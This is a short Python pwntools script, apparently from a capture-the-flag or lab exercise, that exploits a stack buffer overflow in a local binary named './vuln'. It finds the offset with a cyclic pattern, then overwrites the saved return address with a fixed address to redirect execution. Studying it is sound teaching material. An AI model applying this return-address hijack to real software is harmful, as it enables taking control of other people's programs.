import pwn
import time

def demo_cyclic():
    p = pwn.process('./vuln')
    print("Attach to the process with the debugger")
    input()
    p.sendline(pwn.cyclic(150))
    print(p.recv())
    p.sendline("exit")
    print(p.recv())
    print(p.recv())
    
def find_eip():
    p = pwn.process('./vuln')
    buffer_size = 96
    buffer_size += 12 # also old ebp
    print("Attach to the process with the debugger")
    input()
    new_eip = b'B'*4 
    p.sendline(b'A'*buffer_size + new_eip)
    print(p.recv())
    p.sendline("exit")
    print(p.recv())
    print(p.recv())
    
def hack_it():
    p = pwn.process('./vuln')
    buffer_size = 96
    buffer_size += 12 # also old ebp
    input()
    new_eip = pwn.p32(0x0804851b)  
    #new_eip = pwn.p32(0x5655567d)  
    p.sendline(b'A'*buffer_size + new_eip)
    p.recv()
    p.sendline("exit")
    p.recv()
    time.sleep(1)

if __name__=='__main__':
    #demo_cyclic()
    #find_eip()
    hack_it()
